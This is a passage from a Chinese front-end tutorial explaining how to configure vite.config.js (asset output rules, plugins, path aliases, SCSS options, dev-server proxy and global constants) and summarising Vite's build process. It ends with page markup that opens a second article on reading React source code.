        <span class="hljs-attr">chunkFileNames</span>: <span class="hljs-string">'assets/js/[name]-[hash].js'</span>,
        <span class="hljs-comment">// 静态资源分类输出规则：按文件类型拆分目录</span>
        <span class="hljs-attr">assetFileNames</span>: <span class="hljs-function">(<span class="hljs-params">{ name }</span>) =&gt;</span> {
          <span class="hljs-keyword">if</span> (name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.css'</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/css/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.html'</span>)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/html/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.png'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.jpg'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.jpeg'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.svg'</span>)
          ) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/img/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.xls'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.xlsx'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.csv'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.pdf'</span>)
          ) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/files/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-keyword">if</span> (
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.ttf'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.eot'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.woff'</span>) ||
            name.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">'.otf'</span>)
          ) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/fonts/[name]-[hash][extname]'</span>;
          }
          <span class="hljs-comment">// 默认输出目录</span>
          <span class="hljs-keyword">return</span> <span class="hljs-string">'assets/[name]-[hash][extname]'</span>;
        }
      },
      <span class="hljs-comment">// 5. Rollup 插件配置：打包后资源拷贝</span>
      <span class="hljs-attr">plugins</span>: [
        <span class="hljs-title function_">copy</span>({
          <span class="hljs-attr">targets</span>: [
            {
              <span class="hljs-attr">src</span>: [
                <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>/json`</span>,
                <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>/locales`</span>,
                <span class="hljs-string">`dist/cdn/<span class="hljs-subst">${fileDateDir}</span>/index.html`</span>
              ],
              <span class="hljs-attr">dest</span>: <span class="hljs-string">'dist/local'</span>
            }
          ],
          <span class="hljs-comment">// 打包完成后执行拷贝</span>
          <span class="hljs-attr">hook</span>: <span class="hljs-string">'writeBundle'</span>,
          <span class="hljs-comment">// 扁平化目录结构，避免多级嵌套</span>
          <span class="hljs-attr">flatten</span>: <span class="hljs-literal">true</span>
        })
      ]
    }
  },
});
</code></pre>
<h4 data-id="heading-11">配置说明</h4>
<ol>
<li><code>outDir</code> 定义打包输出目录，生产环境使用带时间戳的目录名，实现版本隔离，防止旧资源缓存导致线上问题。</li>
<li>Vite 生产打包（<code>vite build</code>）时，默认会给<strong>静态资源文件</strong>（CSS/图片/字体等）添加内容哈希，规则是：文件名格式：<code>[name].[hash].[ext]</code>（比如 <code>app.8a3b2.js</code>）。对于普通 JS 文件，需通过配置 <code>entryFileNames</code>/<code>chunkFileNames</code> 手动添加 hash。</li>
<li><code>assetFileNames</code> 实现静态资源分类，将 CSS、图片、办公文件、字体分别放入对应目录，便于部署和运维排查。</li>
<li><code>rollupOptions.plugins</code> 中配置 <code>rollup-plugin-copy</code>，在打包完成后将核心资源拷贝到 <code>dist/local</code>，满足本地测试部署需求。</li>
</ol>
<h3 data-id="heading-12">模块三：静态资源扩展配置（assetsInclude）</h3>
<p>Vite 有默认支持的静态资源类型，对于一些特殊格式的文件（如 xlsx、pdf），需要通过 <code>assetsInclude</code> 扩展识别，确保打包时能正确处理这些资源。</p>
<h4 data-id="heading-13">配置逻辑</h4>
<ol>
<li>以数组形式列出需要扩展的静态资源后缀。</li>
<li>配置在顶层字段中，全局生效。</li>
</ol>
<h4 data-id="heading-14">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 其他配置...</span>
  <span class="hljs-comment">// 扩展静态资源类型识别</span>
  <span class="hljs-attr">assetsInclude</span>: [
    <span class="hljs-string">'**/*.xlsx'</span>,
    <span class="hljs-string">'**/*.xls'</span>,
    <span class="hljs-string">'**/*.csv'</span>,
    <span class="hljs-string">'**/*.pdf'</span>,
    <span class="hljs-string">'**/*.png'</span>,
    <span class="hljs-string">'**/*.jpg'</span>,
    <span class="hljs-string">'**/*.svg'</span>
  ],
});
</code></pre>
<h4 data-id="heading-15">配置说明</h4>
<ol>
<li>通配符 <code>**/</code> 表示匹配所有目录下的对应文件。</li>
<li>配置后，这些特殊格式文件可以通过 <code>import</code> 引入，打包时会按照 <code>build.rollupOptions.output</code> 中的规则输出到对应目录。</li>
</ol>
<h3 data-id="heading-16">模块四：插件配置（plugins）</h3>
<p>插件是 Vite 扩展功能的核心载体，通过配置不同插件，可以实现 Vue 解析、JSX 支持、HTML 优化等功能，所有插件配置在 <code>plugins</code> 数组中，按需求引入并初始化。</p>
<h4 data-id="heading-17">配置逻辑</h4>
<ol>
<li>安装所需插件（如 <code>@vitejs/plugin-vue</code>）。</li>
<li>在配置文件中导入插件。</li>
<li>在 <code>plugins</code> 数组中初始化插件，传入必要的配置参数。</li>
</ol>
<h4 data-id="heading-18">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> vue <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue'</span>;
<span class="hljs-keyword">import</span> vueJsx <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-vue-jsx'</span>;
<span class="hljs-keyword">import</span> { createHtmlPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-html'</span>;
<span class="hljs-keyword">import</span> { createSvgIconsPlugin } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-svg-icons'</span>;

<span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 其他配置...</span>
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-comment">// 1. 解析 Vue 单文件组件（.vue），Vue 项目必备</span>
    <span class="hljs-title function_">vue</span>({
      <span class="hljs-attr">template</span>: {
        <span class="hljs-attr">transformAssetUrls</span>: {
          <span class="hljs-attr">video</span>: [<span class="hljs-string">'src'</span>, <span class="hljs-string">'poster'</span>],
          <span class="hljs-attr">source</span>: [<span class="hljs-string">'src'</span>],
          <span class="hljs-attr">img</span>: [<span class="hljs-string">'src'</span>],
          <span class="hljs-attr">image</span>: [<span class="hljs-string">'xlink:href'</span>, <span class="hljs-string">'href'</span>],
          <span class="hljs-attr">use</span>: [<span class="hljs-string">'xlink:href'</span>, <span class="hljs-string">'href'</span>],
          <span class="hljs-attr">a</span>: [<span class="hljs-string">'downloadHref'</span>]
        }
      }
    }),
    <span class="hljs-comment">// 2. 支持 Vue JSX/TSX 语法解析</span>
    <span class="hljs-title function_">vueJsx</span>({}),
    <span class="hljs-comment">// 3. HTML 优化插件：压缩 HTML、动态注入数据</span>
    <span class="hljs-title function_">createHtmlPlugin</span>({
      <span class="hljs-attr">minify</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">entry</span>: <span class="hljs-string">'src/main.js'</span>,
      <span class="hljs-attr">inject</span>: {
        <span class="hljs-attr">data</span>: {}
      }
    }),
    <span class="hljs-comment">// 4. SVG 图标管理插件：生成 SVG Sprite，实现图标复用</span>
    <span class="hljs-title function_">createSvgIconsPlugin</span>({
      <span class="hljs-attr">iconDirs</span>: [path.<span class="hljs-title function_">resolve</span>(process.<span class="hljs-title function_">cwd</span>(), <span class="hljs-string">'src/assets/icons'</span>)],
      <span class="hljs-attr">symbolId</span>: <span class="hljs-string">'g-icon-[name]'</span>
    })
  ],
});
</code></pre>
<h4 data-id="heading-19">配置说明</h4>
<ol>
<li><code>@vitejs/plugin-vue</code>：Vue 项目核心插件，用于解析 <code>.vue</code> 单文件组件，<code>transformAssetUrls</code> 配置用于修正模板中资源的路径解析。</li>
<li><code>@vitejs/plugin-vue-jsx</code>：支持 JSX/TSX 语法，满足个性化编码需求，无需额外配置即可使用。</li>
<li><code>vite-plugin-html</code>：生产环境自动压缩 HTML，支持动态注入数据到 HTML 中，提升页面加载性能。</li>
<li><code>vite-plugin-svg-icons</code>：将指定目录下的 SVG 图标生成 Sprite，在项目中可通过 <code>&lt;svg&gt;&lt;use xlink:href="#g-icon-xxx"&gt;&lt;/use&gt;&lt;/svg&gt;</code> 复用，避免图标重复引入。</li>
</ol>
<h3 data-id="heading-20">模块五：路径别名配置（resolve.alias）</h3>
<p>在大型项目中，相对路径（如 <code>../../../src/components/Modal</code>）会降低开发效率和代码可维护性，通过 <code>resolve.alias</code> 配置路径别名，可简化模块引入路径。</p>
<h4 data-id="heading-21">配置逻辑</h4>
<ol>
<li>借助 <code>path.resolve</code> 解析绝对路径。</li>
<li>在 <code>resolve.alias</code> 中定义别名与对应目录的映射关系。</li>
</ol>
<h4 data-id="heading-22">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 其他配置...</span>
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-comment">// 优先解析 browser 字段和 module 字段</span>
    <span class="hljs-attr">mainFields</span>: [<span class="hljs-string">'browser'</span>, <span class="hljs-string">'module'</span>],
    <span class="hljs-comment">// 路径别名配置</span>
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">'@'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'./src'</span>), <span class="hljs-comment">// 映射 src 目录</span>
      <span class="hljs-string">'@LC'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'../lib-components/src'</span>), <span class="hljs-comment">// 映射外部组件库目录</span>
      <span class="hljs-string">'#'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'./types'</span>), <span class="hljs-comment">// 映射类型定义目录</span>
      <span class="hljs-string">'td-print'</span>: path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'./node_modules/td-print/index.js'</span>) <span class="hljs-comment">// 映射特定模块</span>
    }
  },
});
</code></pre>
<h4 data-id="heading-23">配置说明</h4>
<ol>
<li>配置后，可使用 <code>@/components/Modal</code> 替代 <code>../../../src/components/Modal</code>，简化路径书写。</li>
<li>别名不仅支持目录映射，还支持单个文件映射（如 <code>td-print</code>）：
<ul>
<li><code>td-print</code> 是自定义模块别名，对应项目中 <code>./node_modules/td-print/index.js</code>（前端打印相关第三方库）；</li>
<li>不配置别名时需写完整路径 <code>import print from './node_modules/td-print/index.js'</code>，配置后可直接 <code>import print from 'td-print'</code>，简化导入、提升可读性。</li>
</ul>
</li>
<li><code>path.resolve</code> 用于生成绝对路径，避免不同操作系统下的路径分隔符问题。</li>
<li>补充：路径别名需配合编辑器配置（如 <code>tsconfig.json</code>/<code>jsconfig.json</code> 的 <code>compilerOptions.paths</code>），实现代码提示和跳转。</li>
</ol>
<h3 data-id="heading-24">模块六：CSS 预处理器配置（css）</h3>
<p>Vite 内置支持 SCSS、Less 等 CSS 预处理器，只需安装对应的依赖，再通过 <code>css.preprocessorOptions</code> 配置预处理器参数，即可正常使用。</p>
<h4 data-id="heading-25">配置逻辑</h4>
<ol>
<li>安装 SCSS 依赖（<code>sass</code>，注意不是 <code>node-sass</code>）。</li>
<li>在 <code>css.preprocessorOptions.scss</code> 中配置编译参数、抑制弃用警告等。</li>
</ol>
<h4 data-id="heading-26">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 其他配置...</span>
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-comment">// 使用现代编译器 API，提升兼容性和编译性能</span>
        <span class="hljs-attr">api</span>: <span class="hljs-string">'modern-compiler'</span>,
        <span class="hljs-comment">// 抑制 import 相关的弃用警告，保持构建日志整洁</span>
        <span class="hljs-attr">silenceDeprecations</span>: [<span class="hljs-string">'import'</span>]
      }
    }
  },
});
</code></pre>
<h4 data-id="heading-27">配置说明</h4>
<ol>
<li>使用 SCSS 前需安装依赖：<code>npm install sass --save-dev</code>。</li>
<li><code>api: 'modern-compiler'</code> 指定使用现代编译器 API，替代旧的 <code>node-sass</code> 编译器，提升编译速度和兼容性。</li>
<li><code>silenceDeprecations</code> 用于抑制不必要的弃用警告，避免构建日志被冗余信息覆盖。</li>
</ol>
<h3 data-id="heading-28">模块七：本地开发服务器配置（server）</h3>
<p>该模块用于配置本地开发服务器的相关参数，包括端口、跨域代理、主机访问权限等，核心是通过 <code>proxy</code> 配置解决本地开发的接口跨域问题。</p>
<h4 data-id="heading-29">配置逻辑</h4>
<ol>
<li>配置服务器端口和主机访问权限。</li>
<li>通过 <code>proxy</code> 配置接口转发规则，将前端请求转发到后端服务。</li>
<li>配置 <code>changeOrigin</code> 实现跨域模拟，配置 <code>rewrite</code> 修正请求路径。</li>
</ol>
<h4 data-id="heading-30">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 其他配置...</span>
  <span class="hljs-attr">server</span>: {
    <span class="hljs-comment">// 配置本地开发服务器端口</span>
    <span class="hljs-attr">port</span>: <span class="hljs-number">8387</span>,
    <span class="hljs-comment">// 允许外部设备访问（如手机、同一局域网的其他电脑）</span>
    <span class="hljs-attr">host</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-comment">// 跨域代理配置</span>
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-comment">// 匹配以 /charm 开头的请求</span>
      <span class="hljs-string">'/charm'</span>: {
        <span class="hljs-comment">// 后端服务目标地址</span>
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://10.1.11.11:58***/'</span>,
        <span class="hljs-comment">// 开启跨域模拟：修改请求头中的 Origin 为目标地址</span>
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-comment">// 路径重写：此处保持原路径不变，可根据需求修改</span>
        <span class="hljs-attr">rewrite</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> path.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^\/charm/</span>, <span class="hljs-string">'/charm'</span>)
      },
      <span class="hljs-comment">// 可配置多个代理规则</span>
      <span class="hljs-string">'/g-filestore'</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-string">'http://10.5.11.11:8***/'</span>,
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>
      }
    }
  },
});
</code></pre>
<h4 data-id="heading-31">配置说明</h4>
<ol>
<li><code>port</code> 配置本地开发端口，避免与其他服务端口冲突。</li>
<li><code>host: true</code> 允许外部设备访问，方便在手机上调试移动端页面。</li>
<li><code>proxy</code> 中的 <code>target</code> 为后端服务地址，<code>changeOrigin: true</code> 是解决跨域的核心，通过修改请求头的 Origin 模拟同源请求。</li>
<li><code>rewrite</code> 用于修正请求路径，若前端请求路径与后端接口路径不一致，可通过该配置进行调整。</li>
</ol>
<h3 data-id="heading-32">模块八：全局常量注入配置（define）</h3>
<p>通过 <code>define</code> 可以在项目中注入全局常量，这些常量会在打包时被静态替换，无需手动引入即可在代码中直接使用，适用于埋点、版本号、CDN 路径拼接等场景。</p>
<h4 data-id="heading-33">配置逻辑</h4>
<ol>
<li>在 <code>define</code> 中定义全局常量，注意字符串类型需要使用 <code>JSON.stringify</code> 包裹。</li>
<li>在项目代码中直接访问该常量。</li>
</ol>
<h4 data-id="heading-34">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">return</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-comment">// 其他配置...</span>
  <span class="hljs-attr">define</span>: {
    <span class="hljs-comment">// 注入时间戳全局常量，用于版本标识</span>
    <span class="hljs-string">'import.meta.env.VITE_APP_LOCAL_HASH'</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(fileDateDir)
  },
});
</code></pre>
<h4 data-id="heading-35">配置说明</h4>
<ol>
<li><code>define</code> 中的键名建议遵循 <code>import.meta.env.XXX</code> 格式，与 Vite 内置环境变量格式保持一致。</li>
<li>字符串类型必须使用 <code>JSON.stringify</code> 包裹，否则打包时会被当作变量解析，导致报错。</li>
<li>在项目代码中可直接使用：<code>console.log(import.meta.env.VITE_APP_LOCAL_HASH)</code>，打包后会被静态替换为对应的时间戳字符串。</li>
</ol>
<h2 data-id="heading-36">四、Vite 的构建流程</h2>
<p>尽管 Vite 采用了与 Webpack 不同的底层机制，但它依然遵循清晰的构建流程，分为开发环境和生产环境两个阶段：</p>
<h3 data-id="heading-37">1. 开发环境构建流程</h3>
<ol>
<li>初始化参数：解析 vite.config.js，合并命令行参数，加载环境变量和插件。</li>
<li>启动开发服务器：创建 HTTP 服务，监听指定端口，开启 WebSocket 通信（用于热更新）。</li>
<li>确定入口：加载根目录下的 index.html，自动修正其中的资源路径和公共基础路径。</li>
<li>按需编译模块：浏览器请求某个模块时，Vite 实时对该模块进行编译（如 Vue SFC 解析、TS 转 JS），修正依赖路径后返回给浏览器。</li>
<li>热更新（HMR）：监听项目文件变化，仅重新编译修改的单个模块，通过 WebSocket 向浏览器推送更新通知，浏览器直接替换对应模块，无需全页刷新。</li>
<li>接口代理：根据 server.proxy 配置，将前端请求转发到后端服务，解决跨域问题。</li>
</ol>
<h3 data-id="heading-38">2. 生产环境构建流程</h3>
<ol>
<li>环境准备：解析 mode 参数，加载对应环境变量，清理旧的打包产物。</li>
<li>初始化编译器：合并 vite.config.js 中的 build 配置，初始化 Rollup 编译器，注册所有插件。</li>
<li>解析入口与依赖：以 index.html 为入口，递归分析所有模块的依赖关系，构建完整的依赖图谱。</li>
<li>模块编译与优化：对所有模块进行编译转换，执行 Tree Shaking 剔除死代码，进行代码压缩和混淆。</li>
<li>组装与输出资源：将模块组装为入口代码块、公共代码块，按照配置的输出规则将静态资源写入指定目录。</li>
<li>后续自动化操作：执行插件的 writeBundle 钩子（如资源拷贝），生成最终的打包产物，完成构建。</li>
</ol>
<h2 data-id="heading-39">五、Vite 的核心优势与适用场景</h2>
<h3 data-id="heading-40">核心优势</h3>
<ol>
<li>极速启动：利用浏览器原生 ESM，无需全量打包，开发环境启动速度远超传统打包工具。</li>
<li>快速热更新：仅更新修改的单个模块，热更新响应无延迟，大幅提升开发效率。</li>
<li>丰富的插件生态：支持 Vue、React、TypeScript 等主流技术栈，兼容部分 Rollup 插件，扩展能力强。</li>
<li>开箱即用：内置 TypeScript、JSX、CSS 预处理器等支持，无需额外复杂配置。</li>
<li>高度可配置：vite.config.js 提供完善的配置项，可满足各类项目的工程化需求。</li>
<li>优化的生产打包：基于 Rollup 实现，产出的静态资源体积小、性能优，满足生产环境部署要求。</li>
</ol>
<h3 data-id="heading-41">适用场景</h3>
<ol>
<li>新一代 SPA/MPA 项目开发。</li>
<li>前端组件库开发。</li>
<li>内部中后台系统、管理平台开发。</li>
<li>需要快速迭代的原型项目。</li>
<li>注重开发者体验的团队和项目。</li>
</ol>
<h2 data-id="heading-42">六、总结</h2>
<p>vite.config.js 作为 Vite 项目的核心配置文件，涵盖了环境配置、打包输出、插件扩展、本地开发等多个模块，一份完善的配置能够让前端工程化流程更规范、更高效。</p>
<p>Vite 凭借“开发环境按需编译、生产环境 Rollup 打包”的差异化策略，既解决了传统打包工具的性能瓶颈，又满足了生产环境的部署要求，是现代前端开发的优质选择。掌握 vite.config.js 的配置逻辑，能够充分发挥 Vite 的核心优势，助力项目高效开发与部署。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[都2026年，React源码还值不值得读 ❓❓❓]]></title>    <link>https://juejin.cn/post/7597623392456458291</link>    <guid>https://juejin.cn/post/7597623392456458291</guid>    <pubDate>2026-01-21T12:26:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597623392456458291" data-draft-id="7597640029574348851" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="都2026年，React源码还值不值得读 ❓❓❓"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2026-01-21T12:26:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Moment"/> <meta itemprop="url" content="https://juejin.cn/user/3782764966460398"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            都2026年，React源码还值不值得读 ❓❓❓
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3782764966460398/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Moment
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:26:41.000Z" title="Wed Jan 21 2026 12:26:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body 